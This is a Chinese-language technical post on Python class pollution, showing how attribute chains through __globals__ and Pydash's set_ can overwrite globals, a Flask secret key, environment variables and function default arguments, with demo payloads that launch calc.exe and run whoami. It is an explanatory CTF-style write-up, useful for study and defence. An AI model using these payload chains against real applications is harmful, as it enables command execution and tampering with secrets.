# Python 类原型链污染
## 认识
Python 下的类原型链污染利用，通过这篇[文章](https://blog.abdulrah33m.com/prototype-pollution-in-python/)进行一个认识。
```python
obj, neko = TaskManager(), 123  
assert obj.__init__.__func__ == obj.__class__.__init__  
obj.__class__.__init__.__globals__.__setitem__('neko', 456)  
assert neko == 456
```
在上述例子中，通过 `<function>.__globals__` 获取到了当前位置的全局变量，然后调用 `__setitem__` 进行修改。`obj.__init__`是一个 bound method， 在内部存储了底层函数和绑定的实例，可以使用 `__func__` 和 `__self__` 获取。
在第三方库中，Pydash 对此做了一定封装，其主要逻辑：
```python
for idx, token in enumerate(pyd.initial(tokens)):
	if isinstance(token, PathToken):
		key = token.key
		default_factory = pyd.get(tokens, [idx + 1, "default_factory"], default=default_type)
	else:
		key = token
		default_factory = default_type

	obj_val = base_get(target, key, default=None)
	path_obj = None

	if call_customizer:
		path_obj = call_customizer(obj_val, key, target)

	if path_obj is None:
		path_obj = default_factory()

	base_set(target, key, path_obj, allow_override=False)

	try:
		target = base_get(target, key, default=None)
	except TypeError as exc:  # pragma: no cover
		try:
			target = target[int(key)]
			_failed = False
		except Exception:
			_failed = True

		if _failed:
			raise TypeError(f"Unable to update object at index {key!r}. {exc}")

value = base_get(target, last_key, default=None)
base_set(target, last_key, callit(updater, value))
```
`base_set` 部分：
```python
def base_set(obj, key, value, allow_override=True):
    if isinstance(obj, dict):
        if allow_override or key not in obj:
            obj[key] = value
    elif isinstance(obj, list):
       #...
    elif (allow_override or not hasattr(obj, key)) and obj is not None:
        setattr(obj, key, value)

    return obj
```
所以可以换成 Pydash 的写法：
```python
obj.__class__.__init__.__globals__.__getitem__('__loader__').__init__.__func__.__globals__.__getitem__('sys').__getattribute__('modules').__getitem__('__main__').__setattr__('neko', 789)
assert neko == 789
# x.__getitem__('foo') == x['foo']
# x.__getattribute__('bar') == x.bar
obj.set('__class__.__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.neko', 114514)
assert neko == 114514
```
## 利用
- 全局变量修改，例子见上
- Flask secret key 篡改，一些配置参数改变，同全局变量操作
- os.environ 劫持环境变量，造成命令注入
```python
obj.__class__.__init__.__globals__['subprocess'].os.environ.__setitem__('COMSPEC', "cmd /c calc")
# os.environ['COMSPEC'] = "cmd /c calc"
subprocess.Popen('whoami', shell=True)
```
- 通过覆写来改变函数的默认参数
首先是 function 中的 `__kwdefaults__` ：
```python
def exec(*, cmd='whoami'):
    os.system(cmd)
obj.__class__.__init__.__globals__['exec'].__kwdefaults__.__setitem__('cmd', 'calc.exe')
exec()
```
而 `__kwdefaults__` 存在需要满足 func 的参数中有 `*param`。但需要注意的是并非所有的默认 kw 参数都能覆盖，经过测试发现只能覆盖 `*` 之后的参数。
```python
# `__kwdefaults__`
def func_test(a=1, *, b=1):
	assert a == 1 and b == 2
# a 不能被覆盖，b 能被覆盖
func_test.__kwdefaults__.__setitem__('a', 2)
func_test.__kwdefaults__.__setitem__('b', 2)
func_test()
```
还有一个 `__defaults__`，但由于返回的是 tuple 不可变，所以利用更有限。
```python
# `__defaults__`
def func_test(cmd, mode="r", buffering=-1):
	assert mode == 114 and buffering == 514
	pass
# 若元组个数超过参数个数，则取 last
func_test.__setattr__('__defaults__', ('w', 114, 514))
func_test('SilentE')
```
## 可能的漏洞点
应该只有 CTF 中才有了hh

- 直接使用文章中的 merge 函数
- 使用 pydash 的 `set_`  (Update: 作者已 Fix，新版本已经寄了)
- 漏洞代码 `obj.__setattr__/__setitem__(k: string, v: string)` 中 obj，k，v 完全可控。

![pydash_fix](https://cdn.silente.top/img/pydash_fix.png)